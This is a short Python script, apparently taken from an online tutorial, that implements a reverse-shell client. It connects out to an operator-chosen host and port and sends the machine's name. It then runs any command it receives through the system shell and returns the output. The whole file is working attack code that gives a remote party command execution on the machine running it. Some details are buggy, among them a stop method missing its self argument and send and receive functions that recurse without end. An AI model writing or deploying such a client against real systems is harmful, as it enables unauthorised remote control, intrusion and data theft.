#!/usr/bin/env python
# -*- coding: utf-8 -*-
# revshell_client.py
# http://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/

import socket, os, subprocess, sys, re

class ReverseShellClient:

    s = None

    def connect(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = int(port)
        try:
            print('[!] trying to connect to %s:%s' % (host, port))
            self.s.connect((host, port))
            print('[*] connection established')
            self.s.send(os.environ['COMPUTERNAME'])
        except:
            print('could not connect', file=sys.stderr)

    def receive(self):
        received = self.s.recv(1024)
        tokens = re.split('\s+', received, 1)
        command = tokens[0]
        if command == 'quit':
            self.s.close()
        elif command == 'shell':
            if len(tokens) > 1:
                proc2 = subprocess.Popen(tokens[1], shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE)
                output = proc2.stdout.read() + proc2.stderr.read()
            else:
                output = 'args must follow "shell"'
        else:
            output = 'valid input is "quit" or "shell <cmd>" (e.g. "shell dir")'
        self.send(output)

    def send(self, output):
        self.s.send(output)
        self.receive()

    def stop():
        self.s.close()

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('host')
    p.add_argument('--port', '-p', type=int, default=58777)
    args = p.parse_args()
    client = ReverseShellClient()
    client.connect(args.host, args.port)
    client.receive()
    client.stop()